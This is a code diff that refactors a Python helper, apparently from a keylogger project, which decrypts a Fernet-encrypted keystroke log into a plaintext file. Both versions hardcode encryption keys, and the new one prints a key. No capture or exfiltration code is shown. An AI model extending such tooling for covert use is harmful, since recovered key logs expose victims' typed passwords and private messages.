@@ -1,20 +1,16 @@
-import time
-
 from cryptography.fernet import Fernet
+from generate_key import load_key
 
-key = 't-q7kCwsld-Wyj3b4vnK3p9yEWCKdoVJpnzoB-MA0oI='
-encrypted_file_name = 'C:\\Users\\Kodi_\\Documents\\keylogger\\e_key_log.txt'
 
-try:
-    with open(encrypted_file_name, 'rb') as f:
-        data = f.read()
+def decrypt_file(key, input_file, output_file):
+    cipher_suite = Fernet(key)
+    with open(input_file, 'rb') as file:
+        encrypted_text = file.read()
+    decrypted_text = cipher_suite.decrypt(encrypted_text)
+    with open(output_file, 'wb') as file:
+        file.write(decrypted_text)
 
-    fernet = Fernet(key)
-    decrypted = fernet.decrypt(data)
 
-    with open('decryption.txt', 'ab') as f:
-        f.write(decrypted)
-
-except Exception as e:
-    print(f"Error during decryption: {e}")
-
+loaded_key = load_key()
+print(loaded_key)
+decrypt_file('AMncv3akEPnB5MBYwFrQ4upzymNLZHVMJw_ZmJtPaNU=', "e_key_log.txt", "d_key_log.txt")
